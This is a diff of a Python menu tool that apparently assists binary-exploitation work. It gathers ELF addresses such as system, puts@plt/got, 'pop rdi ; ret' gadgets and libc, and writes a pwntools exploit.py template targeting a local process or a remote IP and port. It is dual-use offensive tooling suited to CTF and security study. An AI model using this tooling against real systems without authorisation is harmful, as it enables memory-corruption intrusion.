@@ -190,7 +190,7 @@ def dispMenu():
          print(colored(DATA[x][:18],colour3), end=' ')
       elif x == 8:
          print(DATA[x][:18], end=' ')         
-      if (x != 8) and (DATA[x][:7] == "unknown"):
+      if (x != 8) and ((DATA[x][:7] == "unknown" or DATA[x][:1] == "0")):
          print(colored(DATA[x][:18],colour7), end=' ')
       elif x != 8:
          print(colored(DATA[x][:18],colour6), end=' ')
@@ -199,7 +199,7 @@ def dispMenu():
          print(colored(HED4[x],colour3), end=' ')
       else:
          print(HED4[x], end=' ')                           
-      if CSEC[x][:7] == "unknown":
+      if (CSEC[x][:7] == "unknown") or (CSEC[x][:1] == "0"):
          print(colored(CSEC[x][:8],colour7), end=' ')
       elif (x > 5) and CSEC[6][:1] != "0":
          print(colored(CSEC[x][:8],colour3), end=' ')     
@@ -238,7 +238,7 @@ def options():
       print(colored(FUNC[14],colour6), end=' ')     
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(03) COUNTER      (13) SYSTEM ADDRESS (23)                  (33) Read  Sections (43) L-Trace Interface (53)               " + '\u2551',end=' ')
+   print('\u2551' + "(03) COUNTER      (13) SYSTEM ADDRESS (23) POP RDI ;    RET (33) Read  Sections (43) L-Trace Interface (53)               " + '\u2551',end=' ')
    if "main" in FUNC[15]:
       print(colored(FUNC[15],colour3), end=' ')
    else:
@@ -252,35 +252,35 @@ def options():
       print(colored(FUNC[16],colour6), end=' ')
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(05) SOURCE INDEX (15) COMPAREADDRESS (25) Select  FILENAME (35) ReadExecutable (45) MSF PatternSearch (55) MSF Shellcode " + '\u2551',end=' ')
+   print('\u2551' + "(05) SOURCE INDEX (15) OVERWRITE ADDR (25) Select  FILENAME (35) ReadExecutable (45) MSF PatternSearch (55) MSF Shellcode " + '\u2551',end=' ')
    if "main" in FUNC[17]:
       print(colored(FUNC[17],colour3), end=' ')
    else:
       print(colored(FUNC[17],colour6), end=' ')     
    print('\u2551')
    # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- - 
-   print('\u2551' + "(06) DESTIN INDEX (16) WRITE  ADDRESS (26) Switch File Mode (36) Read DeBugInfo (46) Set Buffer OFFSET (56)               " + '\u2551',end=' ')
+   print('\u2551' + "(06) DESTIN INDEX (16)                (26) Switch File Mode (36) Read DeBugInfo (46) Set Buffer OFFSET (56)               " + '\u2551',end=' ')
    if "main" in FUNC[18]:
       print(colored(FUNC[18],colour3), end=' ')
    else:
       print(colored(FUNC[18],colour6), end=' ')     
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(07) STACKPOINTER (17) TEST   ADDRESS (27) Examine  Program (37) Read Assembley (47)                   (57) Set I.P./Port " + '\u2551',end=' ')
+   print('\u2551' + "(07) STACKPOINTER (17)                (27) Examine  Program (37) Read Assembley (47)                   (57) Set I.P./Port " + '\u2551',end=' ')
    if "main" in FUNC[19]:
       print(colored(FUNC[19],colour3), end=' ')
    else:
       print(colored(FUNC[19],colour6), end=' ')     
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(08) BASE POINTER (18) CUSTOM ADDRESS (28) CheckSec Program (38) Read   Symbols (48) Dis-Assemble MAIN (58) Write Exploit " + '\u2551',end=' ')
+   print('\u2551' + "(08) BASE POINTER (18)                (28) CheckSec Program (38) Read   Symbols (48) Dis-Assemble MAIN (58) Write Exploit " + '\u2551',end=' ')
    if "main" in FUNC[20]:
       print(colored(FUNC[20],colour3), end=' ')
    else:
       print(colored(FUNC[20],colour6), end=' ')     
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(09) INST POINTER (19) POP RDI ;  RET (29) G.D.B. Functions (39) Read Stab Data (49) Dis-Assemble FUNC (59) Run Exploit   " + '\u2551',end=' ')
+   print('\u2551' + "(09) INST POINTER (19)                (29) G.D.B. Functions (39) Read Stab Data (49) Dis-Assemble FUNC (59) Run Exploit   " + '\u2551',end=' ')
    if "main" in FUNC[21]:
       print(colored(FUNC[21],colour3), end=' ')
    else:
@@ -405,31 +405,19 @@ FUNC = [" "*COL3]*maxDispl
 GRAD = [" "*COL2]*maxDispl
 
 # TEMPORAY DEFUALT VALUES
-
-CSEC[0] = spacePadding("unknown", COL1)
-CSEC[1] = spacePadding("unknown", COL1)
-CSEC[2] = spacePadding("unknown", COL1)
-CSEC[3] = spacePadding("unknown", COL1)
-CSEC[4] = spacePadding("unknown", COL1)
-CSEC[5] = spacePadding("unknown", COL1)
-CSEC[6] = spacePadding("0", COL1)
-CSEC[7] = spacePadding("0", COL1)
-CSEC[8] = spacePadding("0", COL1)
-for x in range(11,12):
-   CSEC[x] = spacePadding(" ", COL1)
     
-HED1[0]  = spacePadding(" SYSTEM ADDRESS", COL1+2)   
-HED1[1]  = spacePadding(" JUMPTOFUNCTION", COL1+2)   
-HED1[2]  = spacePadding(" COMPAREADDRESS", COL1+2)   
-HED1[3]  = spacePadding(" WRITE  ADDRESS", COL1+2)   
-HED1[4]  = spacePadding(" TEST   ADDRESS", COL1+2)   
-HED1[5]  = spacePadding(" CUSTOM ADDRESS", COL1+2)   
-HED1[6]  = spacePadding(" POP RDI ;  RET", COL1+2)   
-HED1[7]  = spacePadding("               ", COL1+2)   
-HED1[8]  = spacePadding(" PUTS@PLT  ADDR", COL1+2)   
-HED1[9]  = spacePadding(" PUTS@GOT  ADDR", COL1+2)
-HED1[10] = spacePadding("               ", COL1+2)
-HED1[11] = spacePadding(" LIBC   ADDRESS", COL1+2)   
+HED1[0]  = spacePadding(" SYSTEM ADDRESS ", COL1+2)   
+HED1[1]  = spacePadding(" JUMPTOFUNCTION ", COL1+2)   
+HED1[2]  = spacePadding(" OVERWRITE ADDR ", COL1+2)   
+HED1[3]  = spacePadding("                ", COL1+2)   
+HED1[4]  = spacePadding("                ", COL1+2)   
+HED1[5]  = spacePadding("                ", COL1+2)   
+HED1[6]  = spacePadding("                ", COL1+2)   
+HED1[7]  = spacePadding("                ", COL1+2)   
+HED1[8]  = spacePadding(" PUTS@PLT  ADDR ", COL1+2)   
+HED1[9]  = spacePadding(" PUTS@GOT  ADDR ", COL1+2)
+HED1[10] = spacePadding(" POP RDI ;  RET ", COL1+2)
+HED1[11] = spacePadding(" LIBC   ADDRESS ", COL1+2)   
    
 HED2[0]  = spacePadding(" RAX/EAX/AX/AH  ", COL1+2)
 HED2[1]  = spacePadding(" RBX/EBX/BX/BH  ", COL1+2)
@@ -456,7 +444,7 @@ HED3[7]  = "LIBC   "
 HED3[8]  = "<======"
 HED3[9]  = "I.P.   "
 HED3[10] = "PORT   "
-HED3[11] = "EXPLOIT"
+HED3[11] = "       "
 
 HED4[0]  = "RELRO  "
 HED4[1]  = "STACK  "
@@ -468,19 +456,31 @@ HED4[6]  = "OFFSET "
 #HED4[7]  = "       "
 HED4[8]  = "======="
 
-
-DATA[0] = spacePadding("unknown", COL1)
-DATA[1] = spacePadding("unknown", COL1)
-DATA[2] = spacePadding("static", COL1)
-DATA[3] = spacePadding("unknown", COL1)
-DATA[4] = spacePadding(flavour, COL1)
-DATA[5] = spacePadding("unknown", COL1)
-DATA[6] = spacePadding("unknown", COL1)
-DATA[7] = spacePadding("unknown", COL1)
-DATA[8] = "="*COL1
-DATA[9] = spacePadding("0", COL1)
+DATA[0]  = spacePadding("unknown", COL1)
+DATA[1]  = spacePadding("unknown", COL1)
+DATA[2]  = spacePadding("unknown", COL1)
+DATA[3]  = spacePadding("unknown", COL1)
+DATA[4]  = spacePadding(flavour, COL1)
+DATA[5]  = spacePadding("unknown", COL1)
+DATA[6]  = spacePadding("unknown", COL1)
+DATA[7]  = spacePadding("unknown", COL1)
+DATA[8]  = "="*COL1
+DATA[9]  = spacePadding("0", COL1)
 DATA[10] = spacePadding("0", COL1)
-DATA[11] = spacePadding("no", COL1)
+DATA[11] = spacePadding(" ", COL1)
+
+CSEC[0]  = spacePadding("unknown", COL1)
+CSEC[1]  = spacePadding("unknown", COL1)
+CSEC[2]  = spacePadding("unknown", COL1)
+CSEC[3]  = spacePadding("unknown", COL1)
+CSEC[4]  = spacePadding("unknown", COL1)
+CSEC[5]  = spacePadding("unknown", COL1)
+CSEC[6]  = spacePadding("0", COL1)
+CSEC[7]  = spacePadding("0", COL1)
+CSEC[8]  = spacePadding("0", COL1)
+CSEC[9]  = spacePadding(" ", COL1)
+CSEC[10] = spacePadding(" ", COL1)
+CSEC[11] = spacePadding(" ", COL1)
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -1030,7 +1030,7 @@ while True:
             if os.path.exists(localDir + "/" + DATA[0].rstrip(" ")):
                command("chmod -x " + localDir + "/" + DATA[0].rstrip(" "))
                DATA[0] = spacePadding(DATA[0],COL1)
-               MOD = spacePadding("Static", COL1)
+               DATA[2] = spacePadding("static", COL1)
             else:
                print("[-] I could not find the file name you entered, did you spell it correctly?...")
                DATA[0] = BAK
@@ -1072,27 +1072,13 @@ while True:
          print("[-] Filename not specified...")
       else:
          print(colored("[*] Examining filename " + localDir + "/" + DATA[0].rstrip(" ") + "...", colour3))         
-         command("objdump -D " + localDir + "/" + DATA[0].rstrip(" ") + " > systems.tmp")         
-         command("cat systems.tmp | grep system > system.tmp")
-         count = lineCount("system.tmp")
-         if count > 1:
-            cutLine(">:","system.tmp")
-         system = linecache.getline("system.tmp",1).split(":")[0]
-         system = system.strip(" ")
-         if (system[:2] != "0x") and (len(system) == 6):
-            system = "0x0000000000" + system 
-         else:
-            system = "0x0000000000000000"           
-         REG2[0] = spacePadding(system, COL1)
-         
          command("file " + localDir + "/" + DATA[0].rstrip(" ") + " > file.tmp")
          command("objdump" + " -f " + localDir + "/" + DATA[0].rstrip(" ") + " > headers.tmp")
-         cutLine(localDir, "headers.tmp")       
+         cutLine(localDir, "headers.tmp")        
          command("cat file.tmp > combined.tmp")
-         command("cat headers.tmp >> combined.tmp")         
+         command("cat headers.tmp >> combined.tmp")
          parsFile("combined.tmp")
-         catsFile("combined.tmp")			# DISPLAYED TO SCREEN
-                  
+         catsFile("combined.tmp")                  
          with open("combined.tmp") as read:
             for binary in read:
                if "ELF" in binary:
@@ -1131,8 +1117,8 @@ while True:
                   command("cat libc.tmp | grep '=>' > address.tmp")
                   with open("address.tmp","r") as address:
                      lib = address.readline()
-                     null1,null2,libc,liba = lib.split(" ")
-                     libc = libc.split("/")[-1]
+                     null1,null2,LIBC,liba = lib.split(" ")
+                     libc = LIBC.split("/")[-1]
                      DATA[7] = spacePadding(libc, COL1)                   
                      liba = liba.replace("(","")
                      liba = liba.replace(")","")
@@ -1185,13 +1171,30 @@ while True:
                   DATA[3] = spacePadding("vax", COL1)
                if "elf" in binary:
                   DATA[1] = spacePadding("elf", COL1)
-               if REG1[10].rstrip(" ") == "0x0000000000000000":          
-                  command("cat headers.tmp | grep 'start' > start.tmp ")
-                  with open("start.tmp","r") as start :
-                     for line in start:
-                        checksum, null, address = line.split(" ")
-                        if checksum[:5] == "start":
-                           REG1[10] = spacePadding(address, COL1)
+         
+         if REG1[10].rstrip(" ") == "0x0000000000000000":          
+            command("cat headers.tmp | grep 'start' > start.tmp ")
+            with open("start.tmp","r") as start :
+               for line in start:
+                  checksum, null, address = line.split(" ")
+                  if checksum[:5] == "start":
+                     REG1[10] = spacePadding(address, COL1)                           
+         if REG2[0].rstrip(" ") == "0x0000000000000000":
+            command("objdump -D " + localDir + "/" + DATA[0].rstrip(" ") + " > systems.tmp")         
+            command("cat systems.tmp | grep system > system.tmp")
+            count = lineCount("system.tmp")
+            if count > 1:
+               cutLine(">:","system.tmp")
+               system = linecache.getline("system.tmp",1).split(":")[0]
+               system = system.strip(" ")
+               if len(system) == 6:
+                  if DATA[5][:2] == "32":
+                     if system[:2] != "0x":
+                        system = "0x" + system
+                  elif DATA[5][:2] == "64":
+                     if system[:2] != "0x":
+                        system = "0x0000000000" + system 
+                  REG2[0] = spacePadding(system, COL1)
       prompt()            
 
 # ------------------------------------------------------------------------------------- 
@@ -1376,7 +1379,7 @@ while True:
          catsFile("gadgets.tmp")                
          command("cat gadgets.tmp | grep 'pop rdi ; ret' > pop.tmp")        
          check = linecache.getline("pop.tmp", 1)
-         REG2[6] = check.split(" ")[0].rstrip(" ")
+         REG2[10] = check.split(" ")[0].rstrip(" ")
          command("mv gadgets.tmp " + localDir + "/gadgets.txt")
       prompt()
    
@@ -1575,8 +1578,11 @@ while True:
       if DATA[0][:7].upper() == "UNKNOWN":
          print("[-] Filename not specified...")
       else:
-         print(colored("[*] Running filename " + localDir + "/" + DATA[0].rstrip(" ") + "...\n", colour3))
-         command(localDir + "/" + DATA[0].rstrip(" "))
+         if DATA[2][:6] == "static":
+            print("[-] File is curently set to static analysis...")
+         else:
+            print(colored("[*] Running filename " + localDir + "/" + DATA[0].rstrip(" ") + "...\n", colour3))
+            command(localDir + "/" + DATA[0].rstrip(" "))
       prompt()   
       
 # ------------------------------------------------------------------------------------- 
@@ -1591,8 +1597,11 @@ while True:
       if DATA[0][:7].upper() == "UNKNOWN":
          print("[-] Filename not specified...")
       else:
-         print(colored("[*] Running filename " + localDir + "/" + DATA[0].rstrip(" ") + "...\n", colour3))
-         command("ltrace ./" + localDir + "/" + DATA[0].rstrip(" "))
+         if DATA[2][:6] == "static":
+            print("[-] File is curently set to static analysis...")
+         else:
+            print(colored("[*] Running filename " + localDir + "/" + DATA[0].rstrip(" ") + "...\n", colour3))
+            command("ltrace ./" + localDir + "/" + DATA[0].rstrip(" "))
       prompt()    
       
 # ------------------------------------------------------------------------------------- 
@@ -1607,10 +1616,13 @@ while True:
       if DATA[0][:7].upper() == "UNKNOWN":
          print("[-] Filename not specified...")
       else:
-         print(colored("[*] Editing filename " + localDir + "/" + DATA[0].rstrip(" ") + "...", colour3))
-         command("echo 'set disassembly-flavor " + flavour.rstrip(" ") + "' > command.tmp")
-         command("echo 'set follow-fork-mode child' >> command.tmp")
-         command("gdb -q " + localDir + "/" + DATA[0].rstrip(" ") + " -x command.tmp")
+         if DATA[2][:6] == "static":
+            print("[-] File is curently set to static analysis...")
+         else:
+            print(colored("[*] Editing filename " + localDir + "/" + DATA[0].rstrip(" ") + "...", colour3))
+            command("echo 'set disassembly-flavor " + flavour.rstrip(" ") + "' > command.tmp")
+            command("echo 'set follow-fork-mode child' >> command.tmp")
+            command("gdb -q " + localDir + "/" + DATA[0].rstrip(" ") + " -x command.tmp")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -1833,31 +1845,36 @@ while True:
       if DATA[0][:7].upper() == "UNKNOWN":
          print("[-] Filename not specified...")
       else:
-         command("echo '#!/usr/bin/python3' > " + localDir + "/exploit.py")
+         command("echo '#!/usr/bin/python3' > " + localDir + "/exploit.py") # CREATE FILE
          command("echo '# coding:UTF-8' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py") # SPACER
-         command("echo '# -------------------------------------------------------------------------------------'  >> " + localDir + "/exploit.py")
-         command("echo '#                    PYTHON SCRIPT DATA[0]E FOR BINARY EXPLOITATION' >> " + localDir + "/exploit.py")
-         command("echo '#               BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)' >> " + localDir + "/exploit.py")
+         command("echo '# -------------------------------------------------------------------------------------' >> " + localDir + "/exploit.py")
+         command("echo '#                    PYTHON SCRIPT FILE FOR BINARY EXPLOITATION                        ' >> " + localDir + "/exploit.py")
+         command("echo '#               BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)                  ' >> " + localDir + "/exploit.py")
          command("echo '# -------------------------------------------------------------------------------------' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py") # SPACER
+        
          command("echo 'from pwn import *' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py") # SPACER
+         
          command("echo 'context.clear()' >> " + localDir + "/exploit.py")
          command("echo 'context.log_level = \"error\" #  also info or debug' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py") # SPACER
-         if COM[:3].upper() == "elf":
-            command("echo 'elf  = elf(\"./" + DATA[0].rstrip(" ") + "\")' >> " + localDir + "/exploit.py")
-            command("echo ' # context.binary = \"./" + DATA[0].rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
+         
+         if DATA[1][:3] == "elf":
+            command("echo 'elf  = ELF(\"./" + DATA[0].rstrip(" ") + "\")' >> " + localDir + "/exploit.py")
+            command("echo '# context.binary = \"./" + DATA[0].rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
             command("echo '' >> " + localDir + "/exploit.py") # SPACER
+            
             command("echo 'rop  = ROP(elf.path)' >> " + localDir + "/exploit.py")
-            command("echo 'libc = elf(\"" + LIB.rstrip(" ") + "\")' >> " + localDir + "/exploit.py")
+            command("echo 'libc = ELF(\"" + LIBC.rstrip(" ") + "\")' >> " + localDir + "/exploit.py")
             command("echo 'info(rop.dump())' >> " + localDir + "/exploit.py")
          else:
             command("echo '# elf  = elf(\"./" + DATA[0].rstrip(" ") + "\")' >> " + localDir + "/exploit.py")
             command("echo 'context.binary = \"./" + DATA[0].rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py") # SPACER
-         if COM[:3].upper() == "elf":
+         
+         if DATA[1][:3] == "elf":
             command("echo '#context.os = \"linux\"' >> " + localDir + "/exploit.py")
          else:
             command("echo '#context.os = \"windows\"' >> " + localDir + "/exploit.py")
@@ -1865,6 +1882,7 @@ while True:
          command("echo '#context.bits = \"" + BIT[:2] + "\"' >> " + localDir + "/exploit.py")
          command("echo '#context.endian = \"" + IND.rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py") # SPACER         
+         
          if DATA[9][:1] == "0":
             command("echo 'ip_address = \"0\"' >> " + localDir + "/exploit.py")          
          else:
@@ -1873,123 +1891,103 @@ while True:
             command("echo 'port = 0' >> " + localDir + "/exploit.py")         
          else:
             command("echo 'port = " + DATA[10].rstrip(" ") + "' >> " + localDir + "/exploit.py")
-         command("echo '' >> " + localDir + "/exploit.py") # SPACER         
+         command("echo '' >> " + localDir + "/exploit.py") # SPACER
+                  
          command("echo 'if ip_address != \"0\":' >> " + localDir + "/exploit.py")
          command("echo '   s = remote(ip_address, port)' >> " + localDir + "/exploit.py")
          command("echo 'else:' >> " + localDir + "/exploit.py")
          command("echo '   s = process(\"./" + DATA[0].rstrip(" ") + "\")'  >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py") # SPACER
-                          
-         command("echo 'RAX = p64(" + REG1[0].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'RBX = p64(" + REG1[1].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'RCX = p64(" + REG1[2].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'RDX = p64(" + REG1[3].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'RSI = p64(" + REG1[4].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'RDI = p64(" + REG1[5].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'RSP = p64(" + REG1[6].rstrip(" ") + ")' >> " + localDir + "/exploit.py")         
-         command("echo 'RBP = p64(" + REG1[7].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'RIP = p64(" + REG1[8].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'PIE_64   = p64(" + REG1[9].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'START_64 = p64(" + REG1[10].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'MAIN_64  = p64(" + REG1[11].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          
-         command("echo '' >> " + localDir + "/exploit.py") # SPACER
+         if DATA[5][:2] == "64":
+            command("echo 'rax_addr  = p64(" + REG1[0].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'rbx_addr  = p64(" + REG1[1].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'rcx_addr  = p64(" + REG1[2].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'rdx_addr  = p64(" + REG1[3].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'rsi_addr  = p64(" + REG1[4].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'rdi_addr  = p64(" + REG1[5].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'rsp_addr  = p64(" + REG1[6].rstrip(" ") + ")' >> " + localDir + "/exploit.py")         
+            command("echo 'rbp_addr  = p64(" + REG1[7].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'rip_addr  = p64(" + REG1[8].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'pie       = p64(" + REG1[9].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'start     = p64(" + REG1[10].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'main      = p64(" + REG1[11].rstrip(" ") + ")' >> " + localDir + "/exploit.py")            
+            command("echo 'system    = p64(" + REG2[0].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'jumpto    = p64(" + REG2[1].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'overwrite = p64(" + REG2[2].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'unset_1   = p64(" + REG2[3].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'unset_2   = p64(" + REG2[4].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'unset_3   = p64(" + REG2[5].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'unset_4   = p64(" + REG2[6].rstrip(" ") + ")' >> " + localDir + "/exploit.py")         
+            command("echo 'unset_5   = p64(" + REG2[7].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'puts_plt  = p64(" + REG2[8].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'puts_got  = p64(" + REG2[9].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'pop_rdi   = p64(" + REG2[10].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'libc_addr = p64(" + REG2[11].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo '' >> " + localDir + "/exploit.py") 
          
-         command("echo 'EAX = p32(" + REG1[0].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'EBX = p32(" + REG1[1].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'ECX = p32(" + REG1[2].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'EDX = p32(" + REG1[3].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'ESI = p32(" + REG1[4].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'EDI = p32(" + REG1[5].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'ESP = p32(" + REG1[6].rstrip(" ") + ")' >> " + localDir + "/exploit.py")         
-         command("echo 'EBP = p32(" + REG1[7].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'EIP = p32(" + REG1[8].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'PIE_32   = p32(" + REG1[9].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'START_32 = p32(" + REG1[10].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'MAIN_32  = p32(" + REG1[11].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-                 
-         command("echo '' >> " + localDir + "/exploit.py")        
-
-         command("echo 'SYSTEM_64  = p64(" + REG2[0].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'JUMP_64    = p64(" + REG2[1].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'COMPARE_64 = p64(" + REG2[2].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'WRITE_64   = p64(" + REG2[3].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'TEST_64    = p64(" + REG2[4].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'CUSTOM_64  = p64(" + REG2[5].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'POPRDI_64  = p64(" + REG2[6].rstrip(" ") + ")' >> " + localDir + "/exploit.py")         
-         command("echo 'UNALL1_64  = p64(" + REG2[7].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'PUTSPLT_64 = p64(" + REG2[8].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'PUTSGOT_64 = p64(" + REG2[9].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'UNALL2_64  = p64(" + REG2[10].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'UNALL3_64  = p64(" + REG2[11].rstrip(" ") + ")' >> " + localDir + "/exploit.py")        
-
-         command("echo '' >> " + localDir + "/exploit.py")        
-         
-         command("echo 'SYSTEM_32  = p32(" + REG2[0].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'JUMP_32    = p32(" + REG2[1].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'COMPARE_32 = p32(" + REG2[2].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'WRITE_32   = p32(" + REG2[3].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'TEST_32    = p32(" + REG2[4].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'CUSTOM_32  = p32(" + REG2[5].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'POPRDI_32  = p32(" + REG2[6].rstrip(" ") + ")' >> " + localDir + "/exploit.py")         
-         command("echo 'UNALL1_32  = p32(" + REG2[7].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'PUTSPLT_32 = p32(" + REG2[8].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'PUTSGOT_32 = p32(" + REG2[9].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'UNALL2_32  = p32(" + REG2[10].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo '#UNALL3_32  = p32(" + REG2[11].rstrip(" ") + ")' >> " + localDir + "/exploit.py")           
-         
-         command("echo '' >> " + localDir + "/exploit.py")                 
-                 
-         command("echo 'OFFSET = (" + CSEC[6].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-
-         command("echo 'PADDING = \"a\" * OFFSET' >> " + localDir + "/exploit.py")
-         command("echo 'TERMINATE = \"\\\\n\"' >> " + localDir + "/exploit.py")         
+         if DATA[5][:2] == "32":
+            command("echo 'eax_addr  = p32(" + REG1[0].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'ebx_addr  = p32(" + REG1[1].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'ecx_addr  = p32(" + REG1[2].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'edx_addr  = p32(" + REG1[3].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'esi_addr  = p32(" + REG1[4].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'edi_addr  = p32(" + REG1[5].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'esp_addr  = p32(" + REG1[6].rstrip(" ") + ")' >> " + localDir + "/exploit.py")         
+            command("echo 'ebp_addr  = p32(" + REG1[7].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'eip_addr  = p32(" + REG1[8].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'pie       = p32(" + REG1[9].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'start     = p32(" + REG1[10].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'main      = p32(" + REG1[11].rstrip(" ") + ")' >> " + localDir + "/exploit.py")       
+            command("echo 'system    = p32(" + REG2[0].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'jumpto    = p32(" + REG2[1].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'overwrite = p32(" + REG2[2].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'unset_1   = p32(" + REG2[3].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'unset_2   = p32(" + REG2[4].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'unset_3   = p32(" + REG2[5].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'unset_4   = p32(" + REG2[6].rstrip(" ") + ")' >> " + localDir + "/exploit.py")         
+            command("echo 'unset_5   = p32(" + REG2[7].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'puts_plt  = p32(" + REG2[8].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
